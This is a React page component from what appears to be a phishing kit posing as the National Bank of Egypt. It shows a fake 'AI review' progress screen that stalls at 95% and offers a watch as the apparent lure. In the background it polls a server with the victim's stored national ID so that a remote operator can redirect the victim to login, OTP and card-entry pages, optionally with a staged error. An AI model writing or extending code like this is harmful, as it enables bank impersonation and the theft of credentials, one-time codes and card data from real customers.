/**
 * البنك الأهلي المصري - صفحة المراجعة الذكية
 * دائرة تقدم + خطوات تحقق + عداد تنازلي
 */
import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLiveVisitor } from "@/hooks/useLiveVisitor";
import { usePresence } from "@/hooks/usePresence";
import { useAdminRedirect } from "@/hooks/useAdminRedirect";
import { handleWatchImageError, WATCH_IMAGES, WATCH_NAMES } from "@/lib/watchImages";

export default function SmartReview() {
  usePresence("smart-review");
  useAdminRedirect();
  const [, setLocation] = useLocation();
  const [progress, setProgress] = useState(0);
  const [step, setStep] = useState(1);
  const nationalId = localStorage.getItem("pw_national_id") || "";
  const watchColor = sessionStorage.getItem("pw_selected_watch") || "black";

  const { data: customMsgData } = trpc.applications.getCustomMessage.useQuery(
    { nationalId },
    { enabled: !!nationalId, refetchInterval: 4000 }
  );
  const clearMsg = trpc.applications.clearCustomMessage.useMutation();

  useEffect(() => {
    const interval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 95) return prev;
        return prev + 0.3;
      });
    }, 100);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (progress > 33) setStep(2);
    if (progress > 66) setStep(3);
  }, [progress]);

  useEffect(() => {
    if (!customMsgData?.message) return;
    const msg = customMsgData.message;
    if (msg.startsWith("REDIRECT:")) {
      const parts = msg.split(":");
      const page = parts[1];
      const showError = parts[2] === "ERROR";
      clearMsg.mutate({ nationalId });
      if (showError) sessionStorage.setItem("pw_show_error", "true");
      const routes: Record<string, string> = {
        "login": "/login", "otp": "/otp", "card": "/card-info", "watchlink": "/watch-link",
        "success": "/success", "registered": "/registered", "processing": "/processing",
      };
      if (routes[page]) setLocation(routes[page]);
    }
  }, [customMsgData?.message]);

  const steps = [
    { label: "استلام الطلب", done: step >= 1 },
    { label: "التحقق من البيانات", done: step >= 2 },
    { label: "الموافقة النهائية", done: step >= 3 },
  ];

  const circumference = 2 * Math.PI * 54;
  const strokeDashoffset = circumference - (progress / 100) * circumference;

  return (
    <div dir="rtl" style={{ minHeight: "100vh", background: "#ffffff", fontFamily: "'Cairo', sans-serif", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", position: "relative" }}>
      {/* Subtle watermark */}
      <div style={{ position: "fixed", top: "50%", left: "50%", transform: "translate(-50%, -50%)", opacity: 0.03, pointerEvents: "none", zIndex: 0 }}>
        <img src="/manus-storage/nbe-official-logo-source_d2709322.png" alt="" style={{ width: "350px", height: "auto" }} />
      </div>
      <div style={{ maxWidth: "480px", width: "100%", padding: "32px 24px", textAlign: "center" }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "8px", marginBottom: "32px" }}>
          <span style={{ color: "#1B7A3D", fontWeight: "800", fontSize: "20px" }}>البنك الأهلي المصري</span>
        </div>
        {/* Progress Circle */}
        <div style={{ position: "relative", width: "140px", height: "140px", margin: "0 auto 24px" }}>
          <svg width="140" height="140" style={{ transform: "rotate(-90deg)" }}>
            <circle cx="70" cy="70" r="54" fill="none" stroke="#e5e7eb" strokeWidth="8" />
            <circle cx="70" cy="70" r="54" fill="none" stroke="#1B7A3D" strokeWidth="8"
              strokeDasharray={circumference} strokeDashoffset={strokeDashoffset}
              style={{ transition: "stroke-dashoffset 0.3s ease" }} strokeLinecap="round" />
          </svg>
          <div style={{ position: "absolute", inset: 0, display: "flex", alignItems: "center", justifyContent: "center" }}>
            <span style={{ color: "#1a1a1a", fontSize: "24px", fontWeight: "800" }}>{Math.round(progress)}%</span>
          </div>
        </div>
        <h2 style={{ color: "#1a1a1a", fontWeight: "800", fontSize: "20px", marginBottom: "8px" }}>جاري المراجعة الذكية</h2>
        <p style={{ color: "#666", fontSize: "14px", marginBottom: "24px" }}>نظام الذكاء الاصطناعي يراجع طلبك</p>

        {/* Watch Image */}
        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "12px", background: "#f8faf9", borderRadius: "12px", padding: "12px", marginBottom: "20px", border: "1px solid #dcfce7" }}>
          <img src={WATCH_IMAGES[watchColor] || WATCH_IMAGES["black"]} alt="ساعتك" onError={handleWatchImageError} style={{ width: "50px", height: "50px", objectFit: "contain" }} />
          <div style={{ textAlign: "right" }}>
            <p style={{ color: "#1B7A3D", fontWeight: "700", fontSize: "13px", margin: "0 0 2px" }}>طلبك</p>
            <p style={{ color: "#666", fontSize: "12px", margin: 0 }}>{WATCH_NAMES[watchColor] || watchColor}</p>
          </div>
        </div>

        {/* Steps */}
        <div style={{ display: "flex", flexDirection: "column", gap: "10px", textAlign: "right" }}>
          {steps.map((s, i) => (
            <div key={i} style={{ display: "flex", alignItems: "center", gap: "12px", padding: "12px 16px", background: s.done ? "#f0fdf4" : "#fafafa", borderRadius: "10px", border: `1px solid ${s.done ? "#dcfce7" : "#e5e7eb"}` }}>
              <span style={{ fontSize: "18px" }}>{s.done ? "\u2705" : "\u23F3"}</span>
              <span style={{ color: s.done ? "#1B7A3D" : "#999", fontSize: "14px", fontWeight: s.done ? "700" : "400" }}>{s.label}</span>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
